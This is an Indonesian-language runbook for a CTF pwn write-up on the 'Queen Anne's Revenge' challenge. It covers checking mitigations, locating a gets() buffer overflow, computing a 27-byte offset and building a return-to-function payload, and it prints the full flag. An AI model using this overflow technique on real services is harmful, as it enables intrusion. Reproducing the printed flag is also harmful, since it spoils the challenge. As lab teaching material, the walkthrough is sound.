# Queen Anne's Revenge — Runbook Kerja Ulang (buat Writeup)

> Challenge: pwn2 / Queen Anne's Revenge (JCC 2026 Quals, Pwn, 65 solves)
> Author: adieos — Flag: `JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}`
> File di folder ini: `chall`, `main.c`, `exploit.py`

---

## Step 1 — Identifikasi binary

```bash
file chall
```
**Expected:**
```
chall: ELF 32-bit LSB executable, Intel i386, dynamically linked,
interpreter /lib/ld-linux.so.2, ..., not stripped
```

Cek mitigasi:
```bash
readelf -h chall | grep -E "Type|Entry"      # Type: EXEC  -> NO PIE
readelf -l chall | grep GNU_STACK            # RW          -> NX nyala (gak masalah)
objdump -t chall | grep stack_chk            # (kosong)    -> NO CANARY
objdump -t chall | grep -E " access$| main$" # alamat fungsi
```
**Expected symbols:**
```
080491e6 g F .text access
080493a5 g F .text main
```

📸 **Screenshot 1**: output `file` + `readelf` + `objdump -t` (bisa digabung 1 terminal).
Caption: *"Binary ELF 32-bit i386, no PIE, no canary — alamat fungsi statis."*

---

## Step 2 — Source review (`main.c`)

Buka `main.c`. Poin yang harus kelihatan di writeup:

- `access(pin)` hanya print flag kalau `pin == 1234`.
- `menu()` memanggil `access(pin)` **hanya** di cabang
  `strcmp(piratename,"blackbeard")==0 && pin==123` → `access` kepanggil dengan 123.
- Kontradiksi → mustahil lewat alur normal → harus exploit.
- `gets(piratename)` → buffer overflow (buffer 15 byte).
- `printf(piratename)` → format string (bonus, gak kepake).

📸 **Screenshot 2**: `main.c` kebuka di editor (VS Code/nano) — highlight baris
`gets(piratename)` & `access(pin)`.

---

## Step 3 — Disassembly buat hitung offset

```bash
objdump -d -M intel chall | sed -n '/<menu>:/,/^$/p'
```
Yang dicari:
```asm
lea eax, [ebp-0x17]     ; gets(piratename)  -> buffer di ebp-0x17
lea eax, [ebp-0x1c]     ; gets(&pin)
```
Hitung offset ke saved return address:
```
saved EBP = ebp+0 (4 byte), saved RET = ebp+4
offset = 0x17 + 4 = 27 byte
```

📸 **Screenshot 3**: output `objdump -d` area `menu()` — kasih panah/annotation
(atau tulis offset 27 di caption).

---

## Step 4 — Susun payload

Logika:
```
' A'*27  -> nutup buffer + saved EBP
0x080491e6 -> return ke access()
0x080493a5 -> return address setelah access selesai (balik ke main)
1234 (0x4d2) -> argumen pin buat access()
```
`exploit.py` udah disediain di folder ini.

📸 **Screenshot 4**: `exploit.py` di editor — highlight bagian `payload = ...`.

---

## Step 5 — Eksekusi ke instance

Spawn instance di platform (10 menit), lalu:

```bash
python3 exploit.py          # atau: python3 exploit.py <HOST> <PORT>
```

**Expected output:**
```
QUEEN ANNE'S REVENGE: Brig Treasure
ye want riches? well then,
identify yerself, ye scallywag:
hand over yer PIN:
Ye Landlubber! Get off me ship and be lost in the sea with them sirens!
Here be yer treasure, matey:
JCC{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_af414429ae82}
```

📸 **Screenshot 5 (paling penting)**: terminal pas exploit jalan + flag muncul.

---

## Catatan buat writeup

- Urutan screenshot = alur cerita writeup: identifikasi → source → offset →
  payload → flag.
- Alternatif tools: `gdb` (break di `ret` menu buat liat stack ketimpa),
  `checksec` (pwntools) kalau mau, `nc` manual buat nunjukin interaksi.
- Burp Suite **tidak relevan** di sini (bukan HTTP) — kalau mau tetap
  mention, jelaskan bahwa untuk raw TCP dipakai netcat/python socket.
